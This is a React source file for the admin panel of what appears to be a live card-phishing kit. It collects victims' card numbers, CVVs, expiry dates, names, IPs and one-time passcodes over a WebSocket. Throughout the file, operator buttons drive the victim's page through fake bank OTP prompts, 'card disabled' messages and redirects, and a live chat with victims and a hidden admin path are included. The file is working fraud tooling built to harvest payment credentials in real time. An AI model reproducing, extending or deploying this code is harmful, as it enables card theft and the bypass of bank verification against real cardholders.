import React, { useState, useEffect, useMemo } from 'react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
import { wsClient } from '@/integrations/ws-client';
import TypingDetector from './TypingDetector';
import EnhancedVisitorInfo from './EnhancedVisitorInfo';
import AdminChat from './AdminChat';
import LiveVisitorNotification from './LiveVisitorNotification';
import BankSelectionModal from './BankSelectionModal';
import AdminTokenLogin from './AdminTokenLogin';
import NetworkStatusDisplay from './NetworkStatusDisplay';
import { useAdminAuth } from '../hooks/useAdminAuth';

interface CardSubmission {
  id: string;
  invoice_id: string;
  card_number: string;
  expiry_month: string;
  expiry_year: string;
  cvv: string;
  card_holder: string;
  amount: string;
  user_ip: string;
  browser: string;
  network: string;
  otp?: string;
  created_at: string;
  isNew?: boolean;
}

interface Visitor {
  id: string;
  ip: string;
  user_agent?: string;
  isp?: string;
  country?: string;
  country_flag?: string;
  device_time?: string;
  created_at: string;
}

const AdminPanel = () => {
  const { isAuthenticated, loading, logout } = useAdminAuth();
  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>(() => {
    const savedSubmissions = localStorage.getItem('card_submissions');
    let parsedSubmissions: CardSubmission[] = [];
    try {
      parsedSubmissions = savedSubmissions ? JSON.parse(savedSubmissions) : [];
    } catch (e) {
      console.error("Failed to parse card submissions from localStorage", e);
    }
    
    return parsedSubmissions.map(submission => ({
      ...submission,
      isNew: false // Initialize as false, will be set to true only for new submissions
    }));
  });
  const [existingSubmissionIds, setExistingSubmissionIds] = useState<Set<string>>(() => {
    const savedSubmissions = localStorage.getItem('card_submissions');
    let parsedSubmissions: CardSubmission[] = [];
    try {
      parsedSubmissions = savedSubmissions ? JSON.parse(savedSubmissions) : [];
    } catch (e) {
      console.error("Failed to parse card submissions from localStorage", e);
    }
    return new Set(parsedSubmissions.map(s => s.id));
  });
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
  const [connectionStatus, setConnectionStatus] = useState<string>('Connecting');
  const [lastHeartbeat, setLastHeartbeat] = useState<Date>(new Date());
  const [notification, setNotification] = useState<string>('');
  const [newVisitorGlow, setNewVisitorGlow] = useState<boolean>(false);
  const [showBankModal, setShowBankModal] = useState(false);
  const [selectedSubmissionId, setSelectedSubmissionId] = useState<string>('');
  const [showVisitorDetails, setShowVisitorDetails] = useState<boolean>(false);
  const [adminCommands, setAdminCommands] = useState<{ [submissionId: string]: string[] }>(() => {
    const savedCommands = localStorage.getItem('admin_commands');
    return savedCommands ? JSON.parse(savedCommands) : {};
  });

  // Save admin commands to localStorage whenever they change
  useEffect(() => {
    localStorage.setItem('admin_commands', JSON.stringify(adminCommands));
  }, [adminCommands]);

  // Save card submissions to localStorage whenever they change
  useEffect(() => {
    localStorage.setItem('card_submissions', JSON.stringify(cardSubmissions));
  }, [cardSubmissions]);

  const showNotification = (message: string) => {
    setNotification(message);
    setTimeout(() => setNotification(''), 3000);
  };

  // Check if a submission has been commanded (has any commands)
  const hasBeenCommanded = (submissionId: string) => {
    return adminCommands[submissionId] && adminCommands[submissionId].length > 0;
  };

  // Check if a submission should show command buttons (not commanded with final commands)
  const shouldShowCommands = (submissionId: string) => {
    const commands = adminCommands[submissionId] || [];
    const finalCommands = ['success', 'fail'];
    return !commands.some(cmd => finalCommands.includes(cmd));
  };

  useEffect(() => {
    const handleConnect = () => {
      setConnectionStatus('Connected');
      setLastHeartbeat(new Date());
      console.log('[AdminPanel] WebSocket connected, sending admin_hello.');
      wsClient.send('admin_hello', {});
    };

    const handleDisconnect = () => {
      setConnectionStatus('Disconnected');
      console.log('[AdminPanel] WebSocket disconnected.');
    };

    const handleConnecting = () => {
      setConnectionStatus('Connecting');
      console.log('[AdminPanel] WebSocket connecting...');
    };

    const handleCardSubmission = (submission: CardSubmission) => {
      console.log('[AdminPanel] Received card_submission:', submission);
      setLastHeartbeat(new Date());
      
      // Check if this submission already exists in localStorage
      const isExistingSubmission = existingSubmissionIds.has(submission.id);
      
      setCardSubmissions(prev => {
        const existingIndex = prev.findIndex(s => s.id === submission.id);
        if (existingIndex >= 0) {
          // Update existing submission without marking as new
          const updated = [...prev];
          updated[existingIndex] = { ...submission, isNew: false };
          return updated;
        } else {
          // Only mark as new if it's truly a new submission (not from localStorage)
          const updatedSubmissions = [{ 
            ...submission, 
            isNew: !isExistingSubmission, 
            created_at: new Date().toISOString() 
          }, ...prev];
          return updatedSubmissions;
        }
      });
      
      // Only show notification for truly new submissions
      if (!isExistingSubmission) {
        showNotification('New card submission received');
      }
    };

    const handleOtpSubmitted = (data: { submission_id: string; otp: string }) => {
      console.log('[AdminPanel] Received otp_submitted:', data);
      setLastHeartbeat(new Date());
      setCardSubmissions(prev =>
        prev.map(s => (s.id === data.submission_id ? { ...s, otp: data.otp } : s))
      );
    };

    const handleVisitorUpdate = (visitor: Visitor) => {
      console.log('[AdminPanel] Received visitor_update:', visitor);
      setLastHeartbeat(new Date());
      const myId = wsClient.getSocketId();
      if (visitor.id === myId) return;
      
      setActiveVisitors(prev => {
        const isNewVisitor = !prev.find(v => v.id === visitor.id);
        if (isNewVisitor) {
          setNewVisitorGlow(true);
          setTimeout(() => setNewVisitorGlow(false), 3000);
          const updatedVisitor = {
            ...visitor,
            ip: visitor.ip || 'Unknown',
            isp: visitor.isp || 'Unknown ISP',
            country: visitor.country || 'Unknown',
            country_flag: visitor.country_flag || '🌍',
            user_agent: visitor.user_agent || 'Unknown',
            device_time: visitor.device_time || new Date().toLocaleString()
          };
          return [...prev, updatedVisitor];
        }
        return prev;
      });
    };

    const handleEnhancedVisitor = (visitor: Visitor) => {
      console.log('[AdminPanel] Received enhanced_visitor:', visitor);
      setLastHeartbeat(new Date());
      const myId = wsClient.getSocketId();
      if (visitor.id === myId) return;
      
      setActiveVisitors(prev => {
        const existingIndex = prev.findIndex(v => v.id === visitor.id);
        const enhancedVisitor = {
          ...visitor,
          ip: visitor.ip || 'Unknown',
          isp: visitor.isp || 'Unknown ISP',
          country: visitor.country || 'Unknown',
          country_flag: visitor.country_flag || '🌍',
          user_agent: visitor.user_agent || 'Unknown',
          device_time: visitor.device_time || new Date().toLocaleString()
        };
        
        if (existingIndex >= 0) {
          const updated = [...prev];
          updated[existingIndex] = enhancedVisitor;
          return updated;
        } else {
          setNewVisitorGlow(true);
          setTimeout(() => setNewVisitorGlow(false), 3000);
          return [...prev, enhancedVisitor];
        }
      });
    };

    const handleVisitorLeft = (payload: { id: string }) => {
      console.log('[AdminPanel] Received visitor_left:', payload.id);
      const myId = wsClient.getSocketId();
      if (payload.id === myId) return;
      setActiveVisitors(prev => {
        const updatedVisitors = prev.filter(v => v.id !== payload.id);
        return updatedVisitors;
      });
    };

    const handleDeleteAllTransactions = () => {
      console.log('[AdminPanel] Deleting all transactions');
      setCardSubmissions([]);
      setAdminCommands({});
      setExistingSubmissionIds(new Set());
      localStorage.removeItem('card_submissions');
      showNotification('All transactions deleted');
    };

    const handleAdminCommand = (command: any) => {
      console.log('[AdminPanel] Received admin_command:', command);
      if (command.submission_id) {
        setAdminCommands(prev => ({
          ...prev,
          [command.submission_id]: [...(prev[command.submission_id] || []), command.command]
        }));
      }
    };

    // Register all event listeners
    wsClient.on('card_submission', handleCardSubmission);
    wsClient.on('otp_submitted', handleOtpSubmitted);
    wsClient.on('visitor_update', handleVisitorUpdate);
    wsClient.on('enhanced_visitor', handleEnhancedVisitor);
    wsClient.on('visitor_left', handleVisitorLeft);
    wsClient.on('delete_all_transactions', handleDeleteAllTransactions);
    wsClient.on('admin_command', handleAdminCommand);
    wsClient.socket.on('connect', handleConnect);
    wsClient.socket.on('disconnect', handleDisconnect);
    wsClient.socket.on('connecting', handleConnecting);

    // Force connection on mount
    console.log('[AdminPanel] Forcing WebSocket connection...');
    if (!wsClient.isConnected()) {
      wsClient.connect();
    } else {
      handleConnect();
    }

    // Connection health check
    const healthCheck = setInterval(() => {
      if (!wsClient.isConnected()) {
        setConnectionStatus('Disconnected');
        console.log('[AdminPanel] Health check: reconnecting...');
        wsClient.connect();
      } else {
        setLastHeartbeat(new Date());
      }
    }, 10000);

    // Set custom favicon for admin panel only
    const favicon = document.createElement('link');
    favicon.rel = 'icon';
    favicon.type = 'image/png';
    favicon.href = 'https://static.thenounproject.com/png/74031-200.png';
    document.head.appendChild(favicon);

    // Load submissions from localStorage on mount
    const saved = localStorage.getItem('card_submissions');
    if (saved) {
      try {
        setCardSubmissions(JSON.parse(saved));
      } catch (err) {
        console.error('[AdminPanel] Failed to parse saved submissions', err);
      }
    }

    // Cleanup function
    return () => {
      clearInterval(healthCheck);
      console.log('[AdminPanel] Cleaning up and disconnecting.');
      wsClient.off('card_submission', handleCardSubmission);
      wsClient.off('otp_submitted', handleOtpSubmitted);
      wsClient.off('visitor_update', handleVisitorUpdate);
      wsClient.off('enhanced_visitor', handleEnhancedVisitor);
      wsClient.off('visitor_left', handleVisitorLeft);
      wsClient.off('delete_all_transactions', handleDeleteAllTransactions);
      wsClient.off('admin_command', handleAdminCommand);
      wsClient.socket.off('connect', handleConnect);
      wsClient.socket.off('disconnect', handleDisconnect);

      if (wsClient.socket.connected) {
        wsClient.disconnect();
      }
    };
    }, [existingSubmissionIds]);

  // Periodic cleanup of stale visitors (older than 2 minutes)
  useEffect(() => {
    const interval = setInterval(() => {
      setActiveVisitors(prev => prev.filter(v => Date.now() - new Date(v.created_at).getTime() < 120000));
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  const sendCommand = (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
    console.log('Admin Panel: Sending command:', command, submissionId, bankData);
    showNotification(`${command.toUpperCase()} command sent`);
    
    // Ensure we have a valid socket ID
    if (!submissionId) {
      console.error('No submission ID provided');
      return;
    }

    const commandData = {
      command,
      submission_id: submissionId,
      created_at: new Date().toISOString(),
    } as any;
    if (bankData) {
      commandData.bank_name = bankData.name;
      commandData.bank_logo = bankData.logo;
    }
    
    console.log('Admin Panel: Sending command to socket ID:', submissionId, commandData);
    wsClient.send('admin_command', commandData);
    
    if (submissionId) {
      setCardSubmissions(prev => prev.map(submission => 
        submission.id === submissionId ? { ...submission, isNew: false } : submission
      ));
    }
  };

  const handleRowClick = (submissionId: string) => {
    setCardSubmissions(prev => prev.map(submission => 
      submission.id === submissionId ? { ...submission, isNew: false } : submission
    ));
  };

  const deleteAllTransactions = () => {
    if (window.confirm('Are you sure you want to permanently delete all transactions? This action cannot be undone and will remove all data permanently.')) {
      // Permanently delete all transaction data
      setCardSubmissions([]);
      setAdminCommands({});
      setExistingSubmissionIds(new Set());
      
      // Remove from localStorage permanently
      localStorage.removeItem('card_submissions');
      localStorage.removeItem('admin_commands');
      
      // Send command to server to delete server-side data as well
      wsClient.send('delete_all_transactions', {});
      
      showNotification('All transactions permanently deleted');
    }
  };

  const generateNewToken = () => {
    if (window.confirm('Are you sure you want to generate a new token? The old token will no longer work.')) {
      // Generate random alphanumeric token (16 characters)
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let newToken = '';
      for (let i = 0; i < 16; i++) {
        newToken += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      
      // Store the new token in localStorage
      localStorage.setItem('current_admin_token', newToken);
      
      // Clear old session to force re-login
      localStorage.removeItem('admin_session');
      
      // Show the new token to admin
      alert(`New token generated: ${newToken}\n\nPlease save this token. The old token is now expired.`);
      
      // Logout to force re-login with new token
      logout();
    }
  };

  const redirectUserToGoogle = (submissionId: string) => {
    if (window.confirm('Are you sure you want to redirect this user to Google? They will not be able to return to your website.')) {
      // Send command to specific user to redirect to Google
      wsClient.send('admin_command', {
        command: 'redirect_to_google',
        submission_id: submissionId,
        created_at: new Date().toISOString(),
      });
      
      showNotification('Redirect command sent to user');
    }
  };

  const handleShowOtp = (submissionId: string) => {
    console.log('Admin Panel: Show OTP clicked for submission:', submissionId);
    setSelectedSubmissionId(submissionId);
    setShowBankModal(true);
  };

  const handleBankSelect = (bankName: string, bankLogo: string) => {
    console.log('Admin Panel: Bank selected:', bankName, bankLogo);
    console.log('Admin Panel: Sending showotp command with submission ID:', selectedSubmissionId);
    sendCommand('showotp', selectedSubmissionId, { name: bankName, logo: bankLogo });
    setShowBankModal(false);
  };

  const handleVisitorCountClick = () => {
    setShowVisitorDetails(!showVisitorDetails);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center">
        <div className="text-white">Loading...</div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return <AdminTokenLogin onTokenVerified={() => window.location.reload()} />;
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-4">
      {/* Enhanced Connection Status */}
      <div className="flex items-center gap-2 mb-4">
        <span className="text-sm">Connection Status:</span>
        <span className={`px-2 py-1 rounded flex items-center gap-2 ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 
          connectionStatus === 'Connecting' ? 'bg-yellow-600' : 
          'bg-red-600'
        }`}>
          {connectionStatus === 'Connected' && <span className="w-2 h-2 bg-green-300 rounded-full animate-pulse"></span>}
          {connectionStatus === 'Connecting' && <span className="w-2 h-2 bg-yellow-300 rounded-full animate-spin"></span>}
          {connectionStatus === 'Disconnected' && <span className="w-2 h-2 bg-red-300 rounded-full"></span>}
          {connectionStatus}
        </span>
        <span className="text-xs text-gray-400">
          Last activity: {lastHeartbeat.toLocaleTimeString()}
        </span>
        
        {/* Force Reconnect Button */}
        <button
          onClick={() => {
            console.log('[AdminPanel] Manual reconnection triggered');
            wsClient.disconnect();
            setTimeout(() => wsClient.connect(), 1000);
          }}
          className="ml-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm"
        >
          Reconnect
        </button>
        
        {/* Generate New Token Button */}
        <button
          onClick={generateNewToken}
          className="ml-4 bg-purple-600 hover:bg-purple-700 text-white px-3 py-1 rounded text-sm"
        >
          Generate New Token
        </button>
        
        {/* Logout Button */}
        <button
          onClick={logout}
          className="ml-auto bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm"
        >
          Logout
        </button>
      </div>

      {/* Connection Health Warning */}
      {connectionStatus !== 'Connected' && (
        <div className="bg-red-600 text-white p-3 rounded-lg mb-4 border-l-4 border-red-300">
          <div className="flex items-center gap-2">
            <span className="text-lg">⚠️</span>
            <div>
              <div className="font-semibold">Connection Issue Detected</div>
              <div className="text-sm">
                {connectionStatus === 'Connecting' 
                  ? 'Attempting to connect to server...' 
                  : 'Unable to connect to server. Live data may not be available.'}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Network Status Display - New Component */}
      <div className="mb-6">
        <NetworkStatusDisplay />
      </div>

      {/* Modern Live Visitor Count */} 
      <div className="fixed top-4 left-4 z-50">
        <div 
          className={`relative w-20 h-20 rounded-full flex items-center justify-center text-white font-bold text-lg cursor-pointer transition-all duration-500 backdrop-blur-md bg-white/10 border border-white/20 shadow-xl ${
            newVisitorGlow ? 'animate-pulse shadow-blue-500/50 shadow-2xl scale-110' : 'hover:scale-105'
          }`}
          onClick={handleVisitorCountClick}
          style={{
            backdropFilter: 'blur(10px)',
            background: 'rgba(255, 255, 255, 0.1)',
          }}
        >
          <div className="text-center">
            <div className="text-2xl font-bold">{activeVisitors.length}</div>
            <div className="text-xs opacity-80">Visitors</div>
          </div>
          {newVisitorGlow && (
            <div className="absolute inset-0 rounded-full bg-blue-400/30 animate-ping"></div>
          )}
        </div>
      </div>

      {/* Live Visitor Details Notification */}
      {showVisitorDetails && (
        <LiveVisitorNotification 
          visitors={activeVisitors} 
        />
      )}

      {/* Notifications */}
      {notification && (
        <div className="fixed top-4 right-4 bg-blue-600 text-white px-4 py-2 rounded-lg shadow-lg">
          {notification}
        </div>
      )}
      <BankSelectionModal
        isOpen={showBankModal}
        onClose={() => setShowBankModal(false)}
        onSelectBank={handleBankSelect}
        submissionId={selectedSubmissionId}
      />
      
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-3xl font-bold">a</h1>
        <button
          onClick={deleteAllTransactions}
          className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
        >
          Delete Transactions
        </button>
      </div>
      
      {/* Card Submissions Section */}
      <div className="bg-gray-800 rounded-lg p-4 mb-4 shadow-lg">
        <h2 className="text-xl font-bold mb-4">Card Submissions</h2>
        {cardSubmissions.length > 0 ? (
          <div className="space-y-4">
            {cardSubmissions.map((submission) => (
              <div
                key={submission.id}
                className={`bg-gray-700 rounded-lg p-4 ${
                  submission.isNew && !hasBeenCommanded(submission.id) 
                    ? 'animate-pulse border-2 border-yellow-500' 
                    : ''
                }`}
                onClick={() => handleRowClick(submission.id)}
              >
                <div className="grid grid-cols-2 gap-4 mb-4">
                  <div className="col-span-2">
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400 text-sm">Card Number</span>
                      <button 
                        onClick={(e) => {
                          e.stopPropagation();
                          navigator.clipboard.writeText(submission.card_number);
                          showNotification('Card number copied!');
                        }}
                        className="text-blue-400 hover:text-blue-300 text-sm"
                      >
                        Copy
                      </button>
                    </div>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.card_number}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">CVV</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.cvv}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Card Holder</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.card_holder}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Expiry Month</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.expiry_month}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Expiry Year</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.expiry_year}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Amount</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.amount}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">OTP</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.otp || 'N/A'}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Browser</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.browser}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">User IP</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.user_ip}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Network</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.network}</div>
                  </div>
                </div>

                {/* Action Buttons - Only show for submissions that haven't been commanded with final commands */}
                {shouldShowCommands(submission.id) && (
                  <div className="grid grid-cols-3 gap-2 mb-4">
                    <button
                      onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
                      className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Show OTP
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('fail', submission.id); }}
                      className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Fail
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); redirectUserToGoogle(submission.id); }}
                      className="bg-white hover:bg-gray-100 text-green-600 px-3 py-2 rounded text-sm flex items-center justify-center gap-1 border shadow-sm w-full"
                    >
                      <img 
                        src="https://www.google.com/favicon.ico" 
                        alt="Google" 
                        className="w-4 h-4"
                      />
                      <span className="font-medium">Redirect</span>
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('success', submission.id); }}
                      className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Success
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('invalidotp', submission.id); }}
                      className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Invalid OTP
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('cardinvalid', submission.id); }}
                      className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Card Invalid
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('carddisabled', submission.id); }}
                      className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Card Disabled
                    </button>
                  </div>
                )}

                {/* Show status for commanded submissions */}
                {hasBeenCommanded(submission.id) && (
                  <div className="mt-4 p-2 bg-gray-600 rounded">
                    <span className="text-sm text-gray-300">
                      Commands sent: {adminCommands[submission.id].join(', ')}
                    </span>
                  </div>
                )}
              </div>
            ))}
          </div>
        ) : (
          <div className="text-gray-400 text-center py-4">No card submissions yet...</div>
        )}
      </div>
      
      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Admin panel is now accessible at /parking55009hvSweJimbs5hhinbd56y</li>
          <li>• Real-time communication via Supabase database</li>
          <li>• Wait for card data to appear in the table above</li>
          <li>• Click on any row to stop the glow effect</li>
          <li>• Use command buttons to control user experience</li>
          <li>• All transactions are saved in Supabase database</li>
          <li>• Cross-browser sessions supported via real-time subscriptions</li>
          <li>• Visitors are automatically removed after 2 minutes of inactivity</li>
          <li>• Click the chat button to start live chat with users</li>
        </ul>
      </div>

      <AdminChat />
    </div>
  );
};

export default AdminPanel;
